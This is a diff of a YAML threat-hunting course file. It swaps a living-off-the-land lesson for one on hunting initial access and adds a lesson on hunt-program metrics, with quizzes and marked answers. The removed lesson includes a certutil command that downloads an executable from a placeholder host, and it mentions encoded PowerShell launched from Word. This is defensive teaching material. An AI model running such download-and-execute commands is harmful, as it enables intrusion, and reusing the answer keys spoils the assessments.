@@ -736,100 +736,187 @@ lessons:
         options: [Normal backups, Lateral movement worth urgent investigation, A DNS change, A patch install]
         answer: 1
         explanation: One host suddenly reaching many others over remote channels is classic lateral movement.
-  - slug: hunt-lolbins
-    title: Hunting Living-off-the-Land Techniques
+  - slug: hunt-initial-access-phishing
+    title: Hunting for Initial Access
     order: 9
     difficulty: intermediate
-    summary: Hunt attackers who abuse built-in, trusted system tools (LOLBins) to blend in, by focusing on anomalous usage and context rather than the presence of the tool itself.
+    summary: Hunt for the earliest stage of an intrusion, how the attacker first got in, by looking for the signs of phishing, malicious documents and exploited exposure before the foothold becomes an incident.
     theory_minutes: 12
     lab_minutes: 54
-    objectives: ["cysa:1.4", "cysa:3.1", "sc200:2"]
+    objectives: ["cysa:1.4", "cysa:3.1", "sc200:4"]
     learning_objectives:
-      - Explain living-off-the-land and why it evades simple detection
-      - Identify commonly abused built-in tools and how attackers use them
-      - Hunt for anomalous usage of trusted binaries by context, not presence
+      - Describe the common initial-access techniques and their telemetry
+      - Hunt for the signs of a foothold being established
+      - Connect an initial-access finding to the activity that follows
     theory: |
-      Sophisticated attackers increasingly avoid bringing their own malware and instead **live off the land**,
-      abusing the legitimate, signed, built-in tools already on the system (**LOLBins** on Windows, standard
-      utilities on Linux). PowerShell, `certutil`, `rundll32`, `wmic`, `bitsadmin`, `curl`, `ssh` and the
-      scripting hosts are all normal administrative tools, which is exactly why attackers use them: they are
-      trusted, present everywhere, and often excluded from suspicion. This defeats detection that looks for
-      unknown or malicious files, because nothing unknown ever touches the disk, the attack is built entirely
-      from tools the defender's own OS provides.
+      Every intrusion has a first step, and hunting for **initial access** aims to catch it before it becomes
+      a full incident. The common routes are well understood: **phishing** that lures a user into opening a
+      malicious attachment or link, **malicious documents** that execute code when opened, exploitation of an
+      **exposed service** or unpatched internet-facing application, and the use of **valid accounts** bought or
+      phished. Each leaves a distinctive early footprint, and because initial access is the narrowest point of
+      the whole attack, catching it there contains an intrusion with the least damage.
 
-      Because the tools themselves are legitimate, hunting LOLBins means shifting from "is this binary bad"
-      to "is this *usage* anomalous". The same `certutil` that an admin uses to manage certificates is
-      suspicious when it downloads a file from the internet; `rundll32` is normal, but not spawned by Word
-      with an odd export; PowerShell is everywhere, but encoded commands, downloads from memory, and
-      execution spawned by an Office document are the tells. The hunt focuses on **context**: the parent
-      process, the command-line arguments, the user, and whether this tool is normally used this way on this
-      host. A LOLBin invoked by a document, with network activity, in a way its administrators never use, is
-      the signal.
+      The telemetry is specific and huntable. Phishing-driven access often shows as an email attachment opened,
+      then an Office application spawning a script interpreter (Word launching PowerShell), then a network
+      connection, a tell-tale chain. Exploited exposure shows as a web or application server spawning a shell
+      or making unexpected outbound connections shortly after an inbound request. Valid-account abuse shows as
+      a first-ever login from a new location or device. The hunter looks for these early sequences rather than
+      waiting for later, louder stages, and uses the organisation's own baseline, which users normally run
+      macros, which servers normally spawn shells (almost none), to tell the foothold from the noise.
 
-      This is where behavioural baselining and the MITRE ATT&CK catalogue pay off, ATT&CK documents the
-      LOLBin techniques, and knowing your environment's normal admin patterns lets you spot the abuse against
-      them. The hunter's discipline is to hunt for the suspicious **pattern** (the download-and-execute, the
-      Office-spawned shell, the encoded command) rather than banning the tool, because these tools are needed
-      for legitimate work and cannot simply be removed. Catching living-off-the-land is one of the clearest
-      examples of why modern detection is behavioural: the artefact is a trusted tool, so only its anomalous
-      use reveals the attacker.
+      What makes initial-access hunting powerful is **connecting it forward**. A single suspicious document
+      execution is a lead; the same host then doing discovery, reaching out to an unfamiliar domain, or a new
+      account appearing turns it into a confirmed foothold with a story. So the hunt does not stop at the first
+      sign, it pivots to what the host or account did next, building the early timeline that lets responders
+      contain the intrusion while it is still one host. The discipline is the same as any hunt, a hit is a lead
+      confirmed against the baseline and corroborating activity, but the payoff is the highest, because
+      catching the attacker at the front door is far cheaper than catching them at the vault.
     examples:
-      - title: Same tool, benign versus abused
+      - title: A phishing foothold chain
         body: |
-          certutil -dump cert.cer          -> admin managing certificates (normal)
-          certutil -urlcache -f http://bad/x.exe x.exe -> downloading a payload (abuse)
-          The binary is identical; the usage and context are the signal.
-      - title: Context that flags a LOLBin
+          email attachment opened -> WINWORD.EXE spawns powershell.exe
+          -> outbound connection to an unfamiliar domain
+          Three ordinary events; the sequence is the foothold.
+      - title: Exploited exposure
         body: |
-          parent: WINWORD.EXE  ->  child: powershell.exe -enc <base64>
-          An Office document spawning an encoded PowerShell command
-          Normal admin never does this -> hunt the pattern, not the tool.
+          inbound request to web server -> server spawns /bin/sh
+          -> outbound to 185.x.x.x shortly after
+          Servers almost never spawn shells; the baseline makes this stand out.
     exercise:
-      title: Hunt a data set for living-off-the-land abuse
-      environment: Sample endpoint/process logs (provided or lab-generated) with benign admin activity and some LOLBin abuse
-      tools: [A SIEM or notebook, sample process-creation logs, a LOLBin/ATT&CK reference, a notes file]
+      title: Hunt a data set for initial access and pivot forward
+      environment: Sample email, endpoint and web/server logs (provided or lab-generated) containing a foothold and benign activity
+      tools: [A SIEM or notebook, sample multi-source logs, a MITRE ATT&CK reference, a notes file]
       steps:
-        - Explain why living-off-the-land defeats detection that looks for unknown or malicious files.
-        - List several commonly abused built-in tools and one abuse technique for each.
-        - Hunt the process logs for a trusted tool used in an anomalous way (download, encoded command, odd parent) and describe what you found.
-        - For one finding, show the context (parent process, command line, user) that makes it suspicious rather than the tool itself.
-        - Explain why banning the tool is not a viable response and what you would detect instead.
-        - Map your findings to ATT&CK techniques and note the normal admin baseline you compared against.
-      deliverable: A hunt write-up explaining the LOLBin problem, listing abused tools, one anomalous-usage finding with its damning context, why banning the tool is not viable, and the ATT&CK mapping.
+        - List the common initial-access techniques and the early telemetry each produces.
+        - Hunt the logs for a phishing-driven foothold (document opened then a script interpreter then network activity) and describe what you find.
+        - Hunt for an exploited-exposure foothold (a server spawning a shell or making unexpected outbound connections).
+        - For one finding, show the baseline that makes it stand out (what that host or user normally does).
+        - Pivot forward from the finding to what the host or account did next, building the early timeline.
+        - Map the findings to ATT&CK initial-access techniques and state how you would confirm before escalating to containment.
+      deliverable: A hunt write-up with the initial-access techniques, one phishing and one exploitation foothold found, the baseline that revealed each, the forward pivot timeline, and the ATT&CK mapping.
     expected_outcome: >
-      You can explain living-off-the-land, recognise the built-in tools attackers abuse, and hunt for
-      anomalous usage by context, parent process, command line and baseline, rather than the mere presence
-      of a trusted binary.
+      You can hunt for initial access, recognising the phishing, malicious-document and exploited-exposure
+      footprints, confirm them against the baseline, and pivot forward to the following activity so an
+      intrusion is contained while it is still a single foothold.
     quiz:
-      - prompt: Living-off-the-land evades simple detection because
+      - prompt: Why is hunting for initial access especially valuable?
         options:
-          - It uses custom malware
-          - It abuses legitimate, trusted built-in tools, so nothing unknown touches the disk
-          - It only works offline
-          - It needs admin rights always
+          - It is the loudest stage
+          - It is the narrowest point of the attack, so catching it there contains the intrusion with the least damage
+          - It cannot be detected
+          - It only matters after encryption
         answer: 1
-        explanation: Using signed, built-in tools means file-based detection finds nothing unknown to flag.
-      - prompt: To hunt LOLBins, you should focus on
+        explanation: Initial access is the front door; catching it there is far cheaper than catching later stages.
+      - prompt: An Office application spawning a script interpreter and then making a network connection suggests
+        options: [Normal use, A phishing-driven foothold being established, A backup, A patch install]
+        answer: 1
+        explanation: Document-to-interpreter-to-network is a classic malicious-document execution chain.
+      - prompt: A web server spawning a shell shortly after an inbound request suggests
+        options: [Routine maintenance, Exploitation of the exposed service, A DNS change, A certificate renewal]
+        answer: 1
+        explanation: Servers almost never spawn shells, so this pattern indicates an exploited foothold.
+      - prompt: After finding a likely foothold, the hunter should
         options:
-          - Whether the binary exists
-          - Whether the usage is anomalous, by parent process, arguments, user and baseline
-          - The file size only
-          - The time of day only
+          - Stop there
+          - Pivot forward to what the host or account did next to build the early timeline
+          - Delete the logs
+          - Ignore the baseline
         answer: 1
-        explanation: The tools are legitimate, so anomalous usage and context, not presence, reveal the attack.
-      - prompt: certutil downloading a file from the internet is suspicious because
+        explanation: Connecting the foothold to subsequent activity confirms the intrusion and enables containment.
+  - slug: hunt-program-metrics
+    title: Building and Measuring a Hunt Program
+    order: 10
+    difficulty: intermediate
+    summary: Turn ad-hoc hunting into a repeatable program with hypotheses, documentation and metrics, so hunts improve detections and coverage over time instead of being one-off efforts.
+    theory_minutes: 12
+    lab_minutes: 54
+    objectives: ["cysa:1.4", "cysa:4.1", "sc200:4"]
+    learning_objectives:
+      - Explain why hunting needs to be a program, not a series of one-off efforts
+      - Structure hunts so their results are repeatable and feed back into detection
+      - Measure a hunt program by outcomes beyond whether it found an intrusion
+    theory: |
+      A single clever hunt is valuable; a **hunt program** is far more so, because it makes the value
+      repeatable and compounding. Ad-hoc hunting, someone pokes at the data when they have time, finds things
+      inconsistently and leaves nothing behind. A program structures the work: hunts are planned around
+      **hypotheses** tied to real threats and the organisation's risk (often framed with MITRE ATT&CK),
+      documented as they run, and, crucially, their results are turned into lasting improvements rather than
+      evaporating when the hunt ends. The shift is from heroics to a discipline that gets better over time.
+
+      Structure starts with the **hypothesis**: a testable statement like "an attacker is using WMI for lateral
+      movement, and we would see it as X". The hunt gathers the relevant data, tests the hypothesis, and reaches
+      a verdict, found evidence, found nothing, or inconclusive because the data was missing. Each outcome is
+      useful. A finding becomes an incident. A clean result with good data increases confidence and, importantly,
+      often becomes a **new detection**, if you could hunt it manually, you can frequently automate it so the
+      SIEM catches it next time. And a hunt blocked by missing data is itself a finding: it reveals a
+      **visibility gap** to close. Documenting each hunt, hypothesis, data used, method, result, means the next
+      hunter builds on it instead of starting over.
+
+      Measuring a hunt program is subtle, because "did we catch an attacker" is the wrong primary metric, most
+      hunts correctly find nothing, and a program judged only on catches would be called a failure while doing
+      its job. Better measures are **outcomes**: new detections created, visibility gaps found and closed,
+      ATT&CK coverage exercised, and dwell-time reductions when hunts do find things. These show the program
+      hardening the environment whether or not any single hunt lands. For the analyst, the lesson is that
+      hunting matures like any capability, from inspired one-offs into a measured program whose real product is
+      better detection and fewer blind spots, not just the occasional dramatic catch.
+    examples:
+      - title: Every hunt outcome is useful
+        body: |
+          found evidence     -> incident
+          clean + good data  -> confidence + often a NEW automated detection
+          blocked, no data   -> a visibility gap to close (also a finding)
+          Nothing is wasted if the hunt is structured.
+      - title: Measuring by outcomes, not catches
+        body: |
+          Wrong metric:  "intrusions caught" (most hunts rightly find none)
+          Right metrics: new detections, gaps closed, ATT&CK coverage, dwell-time reduction
+          The program hardens the environment whether or not a hunt lands.
+    exercise:
+      title: Plan a structured hunt and define program metrics
+      environment: A described environment with available data sources (or a lab), plus a hunt-documentation template
+      tools: [A hunt template, a MITRE ATT&CK reference, available data sources or a lab, a notes file]
+      steps:
+        - Explain why ad-hoc hunting leaves less value than a structured program.
+        - Write a testable hypothesis for a hunt, tied to a real threat and framed with ATT&CK.
+        - Describe the data the hunt needs, the method, and the three possible verdicts (evidence / clean / inconclusive) and what each means.
+        - Explain how a clean result with good data can become a new automated detection, and how a data-blocked hunt reveals a visibility gap.
+        - Document the hunt so a future hunter can build on it (hypothesis, data, method, result).
+        - Define the outcome metrics you would track for the program and explain why "intrusions caught" is the wrong primary measure.
+      deliverable: A structured hunt plan with a hypothesis, data and method, the three verdicts and their follow-ups, documentation for reuse, and a set of outcome metrics for the program.
+    expected_outcome: >
+      You can turn hunting into a repeatable program built on hypotheses and documentation, convert hunt
+      results into new detections and closed visibility gaps, and measure the program by outcomes rather than
+      by whether any single hunt caught an intrusion.
+    quiz:
+      - prompt: Why structure hunting as a program rather than ad-hoc efforts?
         options:
-          - certutil cannot download
-          - That is an abuse of a certificate tool to fetch a payload, unlike its normal use
-          - It is always malicious software
-          - It deletes logs
+          - To do less hunting
+          - To make its value repeatable and compounding, with results that feed back into detection
+          - To avoid documentation
+          - Because hunting never works
         answer: 1
-        explanation: Using a certificate utility to download files is a classic LOLBin technique distinct from its legitimate purpose.
-      - prompt: Why is banning an abused built-in tool usually not viable?
+        explanation: A program makes hunts planned, documented and improvement-driving instead of inconsistent one-offs.
+      - prompt: A hunt that finds nothing but had good data is valuable because it
         options:
-          - It is impossible technically
-          - The tools are needed for legitimate administration, so you detect the abusive pattern instead
-          - It would speed up the system
-          - It has no effect on attackers
+          - Was a waste
+          - Increases confidence and often becomes a new automated detection
+          - Means the data is useless
+          - Should be hidden
         answer: 1
-        explanation: These tools serve real admin needs, so detection targets the suspicious usage pattern rather than removing the tool.
+        explanation: A clean result with solid data builds assurance and can often be automated into a standing detection.
+      - prompt: A hunt blocked by missing data reveals
+        options:
+          - Nothing
+          - A visibility gap to close, which is itself a useful finding
+          - That hunting is pointless
+          - A false positive
+        answer: 1
+        explanation: Missing data that stops a hunt exposes a blind spot the program should remediate.
+      - prompt: Why is "intrusions caught" the wrong primary metric for a hunt program?
+        options:
+          - Catches do not matter
+          - Most hunts correctly find nothing, so a program judged only on catches looks like a failure while doing its job
+          - It is too easy to measure
+          - It ignores detections
+        answer: 1
+        explanation: Since most hunts rightly find nothing, outcomes like new detections and closed gaps better reflect value.
